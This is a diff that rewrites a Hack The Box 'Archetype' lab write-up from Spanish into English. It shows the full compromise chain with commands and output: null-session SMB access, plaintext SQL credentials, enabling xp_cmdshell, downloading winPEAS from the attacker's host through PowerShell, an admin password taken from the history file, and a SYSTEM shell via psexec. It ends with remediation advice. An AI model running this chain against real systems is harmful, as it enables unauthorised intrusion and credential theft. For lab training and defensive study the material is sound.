@@ -1,35 +1,15 @@
----
-categories:
-  - "[[Ciber]]"
-tags:
-  - vms
-  - pentesting
-  - starting-point
-  - smb
-  - mssql
-  - windows
-  - impacket
-  - privilege-escalation
-  - winpeas
-created: 2026-04-21
----
-## 1. Información General
+# Archetype
 
-- **Máquina:** Archetype
-- **IP:** 10.129.88.166
-- **SO:** Windows Server (Windows Server 2008 R2 - 2012)
-- **Dificultad:** Muy fácil
-- **Fecha:** 20/04/2026
+**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Windows · **Difficulty:** Tier 2
 
-## 2. Resumen Ejecutivo
+**Summary:**
+- A `backups` SMB share was readable without authentication and held an SSIS config file (`.dtsConfig`) with plaintext SQL credentials.
+- With those I logged into MSSQL as `sql_svc` (a `sysadmin`), enabled `xp_cmdshell` and ran OS commands.
+- The PowerShell history file contained the Administrator password, and `impacket-psexec` gave a shell as `NT AUTHORITY\SYSTEM`.
 
-Se comprometió un servidor Windows que exponía servicios SMB y Microsoft SQL Server. Durante la enumeración, se descubrió un recurso compartido SMB accesible sin autenticación (`backups`) que contenía un archivo de configuración SSIS (`.dtsConfig`) con credenciales en texto plano para el servicio SQL. Utilizando `impacket-mssqlclient`, se obtuvo acceso al servidor SQL como `sql_svc` con privilegios de `sysadmin`, lo que permitió habilitar `xp_cmdshell` y ejecutar comandos del sistema operativo. La escalada de privilegios se logró al descubrir credenciales de administrador en el historial de PowerShell (`ConsoleHost_history.txt`), y se obtuvo una shell como `NT AUTHORITY\SYSTEM` mediante `impacket-psexec`.
+## 1. Reconnaissance
 
-## 3. Enumeración (Reconocimiento)
-
-### 3.1 Escaneo de Red
-
-**Comando utilizado:** `nmap -sV 10.129.88.166`
+### 1.1 Port scan
 
 ```
 ┌──(julicc㉿diavlo)-[~]
@@ -50,17 +30,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds
 ```
 
-| **Puerto** | **Servicio** | **Versión** | **Estado** |
+| **Port** | **Service** | **Version** | **State** |
 |---|---|---|---|
-| 135 | MSRPC | Microsoft Windows RPC | Abierto |
-| 139 | NetBIOS-SSN | Microsoft Windows netbios-ssn | Abierto |
-| 445 | Microsoft-DS | Windows Server 2008 R2 - 2012 | Abierto |
-| 1433 | MS-SQL | Microsoft SQL Server 2017 14.00.1000 | Abierto |
-| 5985 | HTTP (WinRM) | Microsoft HTTPAPI httpd 2.0 | Abierto |
+| 135 | MSRPC | Microsoft Windows RPC | Open |
+| 139 | NetBIOS-SSN | Microsoft Windows netbios-ssn | Open |
+| 445 | Microsoft-DS | Windows Server 2008 R2 - 2012 | Open |
+| 1433 | MS-SQL | Microsoft SQL Server 2017 14.00.1000 | Open |
+| 5985 | HTTP (WinRM) | Microsoft HTTPAPI httpd 2.0 | Open |
 
-### 3.2 Enumeración SMB
-
-Se listaron los recursos compartidos disponibles mediante `smbclient`:
+### 1.2 SMB enumeration
+Listing the shares with `smbclient`:
 
 ```
 ┌──(julicc㉿diavlo)-[~]
@@ -78,7 +57,7 @@ do_connect: Connection to 10.129.88.166 failed (Error NT_STATUS_RESOURCE_NAME_NO
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-El recurso `backups` resultó accesible sin credenciales (null session):
+`backups` is accessible with a null session:
 
 ```
 ┌──(julicc㉿diavlo)-[~]
@@ -94,9 +73,8 @@ smb: \> get prod.dtsConfig
 getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
 ```
 
-### 3.3 Credenciales Descubiertas en Configuración SSIS
-
-El archivo `prod.dtsConfig` contenía credenciales SQL en texto plano:
+### 1.3 Credentials in the SSIS config
+`prod.dtsConfig` has SQL credentials in plaintext:
 
 ```xml
 ┌──(julicc㉿diavlo)-[~]
@@ -106,18 +84,17 @@ El archivo `prod.dtsConfig` contenía credenciales SQL en texto plano:
         <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
     </DTSConfigurationHeading>
     <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
-        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=[[Archetype|ARCHETYPE]]\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
     </Configuration>
 </DTSConfiguration>
 ```
 
-- **Credenciales comprometidas:** `[[Archetype|ARCHETYPE]]\sql_svc:M3g4c0rp123`
+- **Credentials:** `ARCHETYPE\sql_svc:M3g4c0rp123`
 
-## 4. Explotación
+## 2. Foothold
 
-### 4.1 Acceso al SQL Server
-
-Se utilizó `impacket-mssqlclient` con autenticación Windows para conectarse al servidor SQL. El concepto clave aquí es **Transact SQL shell** con `xp_cmdshell`:
+### 2.1 SQL Server access
+I connected with `impacket-mssqlclient` using Windows authentication. The goal is a Transact-SQL shell with `xp_cmdshell`:
 
 ```
 ┌──(julicc㉿diavlo)-[~]
@@ -128,52 +105,52 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
 [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
 [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
-[*] INFO([[Archetype|ARCHETYPE]]): Line 1: Changed database context to 'master'.
-[*] INFO([[Archetype|ARCHETYPE]]): Line 1: Changed language setting to us_english.
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
 [*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
 [!] Press help for extra shell commands
 ```
 
-### 4.2 Habilitación de xp_cmdshell
-
-El primer paso fue verificar el rol en el servidor con `SELECT is_srvrolemember('sysadmin');`. Al intentar ejecutar `xp_cmdshell` directamente, el acceso estaba bloqueado:
+### 2.2 Enabling xp_cmdshell
+First I checked the server role with `SELECT is_srvrolemember('sysadmin');`. Running `xp_cmdshell` straight away was blocked:
 
 ```
-SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> xp_cmdshell
-ERROR([[Archetype|ARCHETYPE]]): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell
+ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
 ```
 
-Se verificó la configuración con `sp_configure` y se procedió a habilitar las opciones avanzadas y `xp_cmdshell`:
+As `sysadmin` I can turn it on with `sp_configure`, enabling advanced options first:
 
 ```sql
-SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
-INFO([[Archetype|ARCHETYPE]]): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
-SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> RECONFIGURE;
-SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
-INFO([[Archetype|ARCHETYPE]]): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
-SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> RECONFIGURE;
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
+INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
+INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
 ```
 
-### 4.3 Ejecución Remota de Comandos
+### 2.3 Command execution
 
 ```
-SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> EXEC xp_cmdshell 'whoami';
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'whoami';
 output
 -----------------
-[[Archetype|archetype]]\sql_svc
+archetype\sql_svc
 NULL
 ```
 
-### 4.4 Descarga y Ejecución de winPEAS
+## 3. Privilege Escalation
 
-Se transfirió `winPEAS.bat` al servidor para enumeración local:
+### 3.1 Local enumeration with winPEAS
+I transferred `winPEAS.bat` to the server for local enumeration:
 
 ```
-SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.16.225:8000/winPEAS.bat -OutFile C:\Users\Public\winPEAS.bat -UseBasicParsing"';
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.16.225:8000/winPEAS.bat -OutFile C:\Users\Public\winPEAS.bat -UseBasicParsing"';
 output
 ------
 NULL
-SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> EXEC xp_cmdshell 'cmd C:\Users\Public\winPEAS.bat';
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'cmd C:\Users\Public\winPEAS.bat';
 output
 ----------------------------------------------------
 Microsoft Windows [Version 10.0.17763.2061]
@@ -181,34 +158,30 @@ Microsoft Windows [Version 10.0.17763.2061]
 NULL
 ```
 
-![[Pasted image 20260420103007.png]]
+![Pasted image 20260420103007](../../../Attachments/Pasted%20image%2020260420103007.png)
 
-Ejecutando winPEAS:
+Running winPEAS:
 
-![[Pasted image 20260420104648.png]]
+![Pasted image 20260420104648](../../../Attachments/Pasted%20image%2020260420104648.png)
 
-## 5. Escalada de Privilegios
+### 3.2 Credentials in the PowerShell history
+winPEAS shows `SeImpersonatePrivilege`, which would also allow a Juicy Potato attack. Before going there I looked for stored credentials. `sql_svc` is both a regular user and a service account, so frequently used files and command history are worth checking.
 
-### 5.1 Credenciales en el Historial de PowerShell
-
-Del output de winPEAS se observó que tenemos `SeImpersonatePrivilege`, que también es vulnerable al exploit Juicy Potato. Sin embargo, primero se comprobaron los archivos donde podrían existir credenciales. Al ser una cuenta de usuario normal y también una cuenta de servicio, merece la pena comprobar archivos frecuentemente accedidos o comandos ejecutados.
-
-Se leyó el historial de PowerShell, que es el equivalente de `.bash_history` en sistemas Linux. El archivo `ConsoleHost_history.txt` se encuentra en:
+PowerShell's history file is the Windows equivalent of `.bash_history`. `ConsoleHost_history.txt` lives in:
 
 `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`
 
 ```
 C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
 type ConsoleHost_history.txt
-net.exe use T: \\[[Archetype]]\backups /user:administrator MEGACORP_4dm1n!!
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
 exit
 ```
 
-- **Credenciales comprometidas:** `administrator:MEGACORP_4dm1n!!`
+- **Credentials:** `administrator:MEGACORP_4dm1n!!`
 
-### 5.2 Acceso como SYSTEM via impacket-psexec
-
-Con las credenciales de administrador, se obtuvo una shell como `NT AUTHORITY\SYSTEM`:
+### 3.3 SYSTEM shell with impacket-psexec
+With the Administrator password, psexec gives a shell as `NT AUTHORITY\SYSTEM`:
 
 ```
 ┌──(julicc㉿diavlo)-[~]
@@ -229,17 +202,18 @@ Microsoft Windows [Version 10.0.17763.2061]
 C:\Windows\system32>
 ```
 
-**Compromiso total del sistema alcanzado como `NT AUTHORITY\SYSTEM`.**
+Full compromise as `NT AUTHORITY\SYSTEM`.
 
-## 6. Remediación y Conclusiones
+## 4. Conclusion
 
-- **Criticidad:** Crítica
+**Severity:** Critical
 
-**Recomendaciones:**
+**Chain:** null-session SMB share → plaintext SQL credentials → `sysadmin` on MSSQL → `xp_cmdshell` → admin password in PowerShell history → SYSTEM via psexec.
 
-1. **Eliminar credenciales en archivos de configuración:** Los archivos `.dtsConfig` no deben contener contraseñas en texto plano. Utilizar mecanismos seguros de almacenamiento de secretos como Azure Key Vault o Windows Credential Manager.
-2. **Restringir acceso a recursos compartidos SMB:** El recurso `backups` no debería ser accesible sin autenticación (null session). Implementar ACLs restrictivas.
-3. **Deshabilitar xp_cmdshell:** Mantener `xp_cmdshell` deshabilitado permanentemente y restringir los privilegios de `sysadmin` a las cuentas estrictamente necesarias.
-4. **Limpiar historial de PowerShell:** El historial de comandos puede contener credenciales. Configurar políticas de limpieza automática y nunca introducir contraseñas como argumentos de línea de comandos.
-5. **Principio de mínimo privilegio:** La cuenta `sql_svc` no debería tener rol `sysadmin`.
-6. **Segregación de credenciales:** No reutilizar contraseñas entre cuentas de servicio y cuentas de administrador.
+**Remediation:**
+1. **No credentials in config files:** `.dtsConfig` files shouldn't hold plaintext passwords. Use a secrets store such as Azure Key Vault or Windows Credential Manager.
+2. **Lock down SMB shares:** `backups` shouldn't allow null sessions. Apply restrictive ACLs.
+3. **Keep xp_cmdshell disabled:** and grant `sysadmin` only to accounts that really need it.
+4. **Mind the PowerShell history:** it can contain credentials. Set up automatic cleanup and never pass passwords as command-line arguments.
+5. **Least privilege:** `sql_svc` shouldn't be `sysadmin`.
+6. **Separate credentials:** don't reuse passwords between service and administrator accounts.
